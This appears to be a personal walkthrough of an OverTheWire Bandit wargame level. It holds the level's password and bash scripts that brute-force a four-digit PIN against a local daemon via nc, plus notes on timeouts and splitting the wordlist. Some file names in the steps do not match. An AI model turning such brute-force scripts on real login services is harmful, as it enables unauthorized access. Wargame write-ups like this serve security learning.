[Bandit Level 24 → Level 25](https://overthewire.org/wargames/bandit/bandit25.html)

> A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  

username: bandit24  
password: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar  

Solution below:  
———————————————————————————————————————  
`ssh bandit24@bandit.labs.overthewire.org -p2220`  
So we know from previous levels we can submit to that port with `nc -N localhost 30002` when we try that it outputs the below:  
> I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.  

So, we can then send it:  
`VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0000` and that outputs the below and prompts again.  
> Wrong! Please enter the correct pincode. Try again.  

Obviously, we're going to have to script this, but how can we submit that data via the script? I read the man pages which didn't give a perfect answer so let's just give something a try here:  
```
#!/bin/bash
nc -N localhost 30002
for i in $(seq -f "%04g" 0 9999)
do
  echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar" + $i
done
``` 
Note: We need to pad so they're all 4 characters long, I found this for loop online to do that.  
`mkdir /tmp/gabedini` and then `cd /tmp/gabedini`  and `nano script.sh` paste in the above and control+x to exit.  
Give it executable permissions, `chmod +x script.sh`  
Well that didn't work because it opened the connection and waited instead of taking the echos...I also see that it included the + so I have a syntax error there.  
I think we need to read those in from a file, so what we'll do instead is make a file with those combos and then try that.  
```
#!/bin/bash

for i in $(seq -f "%04g" 0 9999)
do
  echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i" >> passwordsdontuse.txt
done
```  
`nc localhost 30002 <passwords.txt`  
Ok so that is working to do it that way, but it seems to time out after about 6k even if I manually set the number of seconds, so I think it might be a rate limiter on the other side? Not sure, but we're going to make a second file, the script looks like this now (could have just modified to make a second set, but we're making it as it would be if it worked in one go):  
```
#!/bin/bash

for i in $(seq -f "%04g" 0 5000)
do
  echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i" >> passwords.txt
done

for i in $(seq -f "%04g" 5001 9999)
do
  echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i" >> passwords2.txt
done
```  
And then running this gets us the password:  `nc localhost 30002 <passwords2.txt`  

`exit`  